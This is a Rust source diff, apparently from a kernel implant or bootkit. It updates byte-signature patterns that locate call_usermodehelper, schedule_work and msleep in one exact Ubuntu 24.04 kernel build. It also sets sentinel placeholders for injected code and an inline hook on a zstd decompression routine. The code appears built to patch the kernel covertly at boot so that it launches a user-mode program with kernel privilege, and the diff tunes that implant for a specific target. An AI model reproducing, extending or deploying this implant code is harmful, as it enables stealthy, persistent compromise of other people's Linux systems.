@@ -3,9 +3,8 @@ use log::{debug, error, info};
 use crate::helpers::{
     file_helper::{cave_finder_by_section_name, cave_finder_by_section_name_excluding_after},
     memory_helper::{
-        INLINE_HOOK_SIZE, InitcallPhase, InlineHook, binary_search,
-        find_sentinel_4, get_initcall_phase_address, restore_inline_hook,
-        translate_physical_to_virtual,
+        INLINE_HOOK_SIZE, InitcallPhase, InlineHook, binary_search, find_sentinel_4,
+        get_initcall_phase_address, restore_inline_hook, translate_physical_to_virtual,
     },
 };
 
@@ -15,21 +14,28 @@ pub static mut ZSTD_DECOMPRESS_DCTX_HOOK_INLINE: InlineHook = InlineHook {
     original_bytes: [0; INLINE_HOOK_SIZE],
 };
 
-// Pattern for call_usermodehelper in Ubuntu 24.04 LTS kernel (6.8.x target).
-// Derived from disassembly of the target vmlinuz. Update if targeting a different kernel.
-const CALL_USERMODEHELPER_PATTERN: &[u8] =
-    &[0x81, 0xC6, 0xC0, 0x0D, 0x00, 0x00, 0x48, 0xC1, 0xE8, 0x3C];
-const CALL_USERMODEHELPER_DISTANCE: u8 = 0x40;
+// Exact Ubuntu 24.04 kernel 7.0.0-31-generic signatures, derived from
+// vmlinux SHA-256 1521707809f7240678403a70e40ff705a752bcca72b44fc7689f5a010d388450.
+const CALL_USERMODEHELPER_PATTERN: &[u8] = &[
+    0xE8, 0x5B, 0xE3, 0xF8, 0xFF, 0x55, 0x83, 0xF9, 0x01, 0x48, 0x89, 0xE5, 0x41, 0x56, 0x41, 0x89,
+    0xCE, 0x41, 0x55, 0x48, 0x8B, 0x45, 0x08,
+];
+const CALL_USERMODEHELPER_DISTANCE: u8 = 0;
 const CALL_UMH_REL_SENTINEL: u32 = 0xDDEEFF00;
 const ARGV0_VIRT_SENTINEL: u64 = 0xAAAAAAAAAAAAAAAA;
 const WORK_STRUCT_DISP_SENTINEL: u32 = 0x11223344;
 const ORIGINAL_FN_REL_SENTINEL: u32 = 0x12345678;
-const SCHEDULE_WORK_PATTERN: &[u8] = &[0x48, 0x89, 0xFA, 0xBF, 0x00, 0x20, 0x00, 0x00];
-const SCHEDULE_WORK_DISTANCE: u8 = 8;
-const MSLEEP_PATTERN: &[u8] = &[
-    0x48, 0x89, 0xC3, 0x66, 0x90, 0x41, 0xC7, 0x44, 0x24, 0x18, 0x02,
+// Starts immediately after the wrapper's __fentry__ call and reaches queue_work_on.
+const SCHEDULE_WORK_PATTERN: &[u8] = &[
+    0x55, 0x48, 0x8B, 0x35, 0x1B, 0x9B, 0xD7, 0x02, 0x48, 0x89, 0xFA, 0xBF, 0x00, 0x20, 0x00, 0x00,
+    0x48, 0x89, 0xE5, 0xE8, 0x33, 0xE2, 0xAE, 0xFF,
 ];
-const MSLEEP_DISTANCE: u8 = 0x1E;
+const SCHEDULE_WORK_DISTANCE: u8 = 0;
+const MSLEEP_PATTERN: &[u8] = &[
+    0xE8, 0xCB, 0xB7, 0xE7, 0xFF, 0x55, 0x48, 0x89, 0xE5, 0xE8, 0xC2, 0x6B, 0xFF, 0xFF, 0x48, 0x85,
+    0xC0, 0x74, 0x10, 0x48, 0x89, 0xC7,
+];
+const MSLEEP_DISTANCE: u8 = 0;
 const SCHEDULE_WORK_REL_SENTINEL: u32 = 0xAABBCCDD;
 const MSLEEP_REL_SENTINEL: u32 = 0x11AABBCC;
 const LKM_WORKER_DISP_SENTINEL: u32 = 0xAABBCCEE;
